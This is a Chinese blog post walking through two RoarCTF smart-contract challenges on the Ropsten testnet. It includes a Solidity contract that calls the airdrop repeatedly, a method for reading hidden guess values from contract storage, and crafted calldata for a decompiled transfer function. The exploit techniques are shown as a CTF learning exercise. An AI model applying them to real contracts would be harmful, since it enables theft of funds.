<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author"><title>RoarCTF智能合约题 writeup两则 · yogurt</title><meta name="description" content="COINFLIP根据题目描述，没有附件，直接看源码：https://ropsten.etherscan.io/address/0xf60adef7812214ebc746309ccb590a5dbd70fc21#code
1.要获取flag，必须账户余额必须大于500ether(注意：这里的ethe"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 5.4.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">yogurt</a></h3></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">Home</a></li><li><a href="/about">Sobre</a></li><li><a href="/archives">Arquivo</a></li><li><a href="/links">Links</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>RoarCTF智能合约题 writeup两则</a></h3></div><div class="post-content"><h2 id="COINFLIP"><a href="#COINFLIP" class="headerlink" title="COINFLIP"></a>COINFLIP</h2><p>根据题目描述，没有附件，直接看源码：<a target="_blank" rel="noopener" href="https://ropsten.etherscan.io/address/0xf60adef7812214ebc746309ccb590a5dbd70fc21#code">https://ropsten.etherscan.io/address/0xf60adef7812214ebc746309ccb590a5dbd70fc21#code</a></p>
<p>1.要获取flag，必须账户余额必须大于500ether(注意：这里的ether只是一个单位，10的18次方):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function CaptureTheFlag(string b64email) public returns(bool)&#123;</span><br><span class="line">    require (balances[msg.sender] &gt; 500 ether);</span><br><span class="line">    emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.看代码如何获取token，该处有一个空投函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function Ap() public &#123;</span><br><span class="line">    if(balances[msg.sender] == 0) &#123;</span><br><span class="line">    balances[msg.sender]+=1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>当账户余额是0时，调用该函数能够获取1ether，那么如果一个账户要有500ether，就有两种方法<br>创建500个账户，分别调用一次该函数，并将获取的token都转到同一个账户X，那么X账户余额就有了500ether，就可以执行CaptureTheFlag。<br>创建一个账户，每调用Ap()一次后将余额转到账户X，再继续调用Ap()，再转账，执行500次。<br>3.攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Hack</span><br><span class="line">&#123;</span><br><span class="line">  P_Bank public pb;</span><br><span class="line">  event Ctflog(address addr_);</span><br><span class="line">  function attack(address target,int len) public&#123;  </span><br><span class="line">    for(int i=0;i&lt;len;i++)&#123;</span><br><span class="line">      pb = P_Bank(target);    //这个放在循环外面就是思路2，放在里面就是思路1，差别不大。</span><br><span class="line">      pb.Ap();</span><br><span class="line">      emit Ctflog(msg.sender);  //msg.sender执行该函数的账户</span><br><span class="line">      pb.Transfer(msg.sender,1 ether);</span><br><span class="line">    &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但由于gas的限制，循环次数可能不能直接设置500，我这里设置200，200，100.</p>
<p>执行结束后，我的账户里就有了500ether，这时候就可以成功调用CaptureTheFlag，获得flag。<br>flag：RoarCTF{wm-da64ccd4c370ab6a8ee64381cfa14a1e</p>
<h2 id="合约第二题-Honey-Lock"><a href="#合约第二题-Honey-Lock" class="headerlink" title="合约第二题 Honey Lock"></a>合约第二题 Honey Lock</h2><p>题目给了源码(后来发现是部分)和合约地址：<a target="_blank" rel="noopener" href="https://ropsten.etherscan.io/address/0x8d73365bb00a9a1a06100fdfdc22fd8a61cfff93#code">https://ropsten.etherscan.io/address/0x8d73365bb00a9a1a06100fdfdc22fd8a61cfff93#code</a><br>第一次做比赛题，开始被坑了，以为附件给出的就是全部源码。下面给出解题过程：<br>读附件源码，调用CaptureTheFlag，必须满足两个条件：<br>takeRecord[msg.sender] == true；<br>balances[msg.sender] == 0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function CaptureTheFlag(string b64email) public returns(bool)&#123;</span><br><span class="line">      require (takeRecord[msg.sender] == true);</span><br><span class="line">      require (balances[msg.sender] == 0);</span><br><span class="line">      emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>第一个条件有两个地方可以得到满足：构造函数HoneyLock()和takeMoney()，显然是要调takeMoney()，但是调用该函数后会得到一个空投，<code>balances[owner] = airDrop;</code>,从而无法满足上述的条件2，那么就要找找怎么把账户的余额转出去。看附件代码，有一个transfer()和withdraw() 都可以实现，但是仔细看一下，发现了问题：<br>对于transfer()，加了一个时间转账的条件：<br><code>modifier lock() &#123;       require (now &gt; timeHouse[msg.sender]);       _;     &#125; </code><br>现在的时间必须大于<code>timeHouse[msg.sender]</code>,但是在调用takeMoney()的时候，该变量的时间已经被赋值为一年后：<code>timeHouse[owner] = time;</code>,<code>uint public time = now + 1 years;</code>，因此该函数没法调用。</p>
<p>对于withdraw() ，要执行成功必须满足两个条件：onlyOwner，和takeRecord[msg.sender] == true，这里第二个条件在调用了takeMoney()之后就已经满足了，主要是第一个，看了一个代码，发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  function useCode(uint256 code) public payable &#123;</span><br><span class="line">      require ((code == guessCode) &amp;&amp; (msg.value &gt;= guessValue)); </span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>猜数字，我们知道在区块链里全局变量是可以直接通过getStorage读取的，只要知道变量对应的存储slot就可以，分析一下知道guessCode的slot=5，guessValue的slot=6，用rpc api查看值：<br><img src="https://raw.githubusercontent.com/n0pn0pn0p/n0pn0pn0p.github.io/master/myimages/107ad97c.png" alt="107ad97c.png"></p>
<p>code=0x29a（对应十进制666）,value=0x2386f26fc10000（对应十进制0.01ether），调用useCode，666作为参数，msg.value=0.01ether就可以调用成功，此时 owner 就是 msg.sender了，按道理应该是可以调用withdraw()，可是调用报错。<br>只能改变思路，想起来还有一个transferFrom()也可以转账，这边也没有重写，应该可以通过approve和transferFrom()来转账。操作一波后发现也调用不了。百思不解不得其解，不过就在刚刚写文档的时候想起来了，transferFrom()内部也会调用transfer()啊。<br>这也不行，就想起了给的合约地址，没有源码，就反编译了一波，发现了原来给的不是全部源码呀，而且还有误导的地方，比如onlyOwner这里并不是要owner=msg.sender，而是(msg.sender == storage[4])（这个onlyOwner不知道是不是自己理解有问题，还需要继续看一下）。然后源码里面要有另一个无法反编译出函数名的函数，和transferFrom()有点类似，但是多了一个参数，这个参数对该转账加了一个限制条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//https://ropsten.etherscan.io反编译的伪代码</span><br><span class="line">function 5ad0ae39() public &#123;</span><br><span class="line">    require((_arg2 &lt;= allowance[_arg0]));</span><br><span class="line">    require(((storage[2] + msg.sender) == _arg3));</span><br><span class="line">    balanceOf[_arg0] -= _arg2;</span><br><span class="line">    balanceOf[_arg1] = (balanceOf[_arg1] + _arg2);</span><br><span class="line">    allowance[_arg0] -= _arg2;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>限制条件就是storage[2] + msg.sender == _arg3，storage[2]的内容对应十进制是53231323（出题人莫不是在玩吉他的时候想出的题？），也就是说第四个参数是msg.sende加上53231323。</p>
<p> 调用5ad0ae39() 之前需要调用approve()，把账户A的余额委托给B，然后由B调用5ad0ae39()将A的钱转给C，简单一点，就将账户A余额委托给A，然后A调用5ad0ae39()将钱转给地址0x00：<br>这个approve()的调用可以直接在remix里面进行：<br><img src="https://raw.githubusercontent.com/n0pn0pn0p/n0pn0pn0p.github.io/master/myimages/13b2e6df.png" alt="13b2e6df.png"></p>
<p>5ad0ae39()需要用api，先把data整理一下：函数名+四个参数：<br>0x5ad0ae39000000000000000000000000967f8ac6502ecba2635d9e4eea2f65ad4940b1b1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e8000000000000000000000000967f8ac6502ecba2635d9e4eea2f65ad4c6cf08c</p>
<p>然后在console里调用eth.sendTransaction()：<br><img src="https://raw.githubusercontent.com/n0pn0pn0p/n0pn0pn0p.github.io/master/myimages/28773450.png" alt="28773450.png"></p>
<p>metamask会弹出转账窗口，调整gas数就等待交易完成了。<br>这边开始用的sendSignedTransaction(),但始终不成功，不知道有没有大佬熟悉这个接口调用的，指导一下。</p>
<p>到这里就满足takeRecord[msg.sender] == true并且账户余额为0,可以调用CaptureTheFlag方法，坐等flag。<br>flag：RoarCTF{wm-87fc255216991be9173a59aa8b6845a0}</p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-10-14</span><i class="fa fa-tag"></i></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://young.0kami.cn/2019/10/14/RoarCTF智能合约writeup/,yogurt,RoarCTF智能合约题 writeup两则,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2020/02/23/chrome%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" title="浏览器插件">Post Anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/09/19/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6opcode%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%20partII/" title="以太坊智能合约opcode分析入门 partII">Próximo post</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>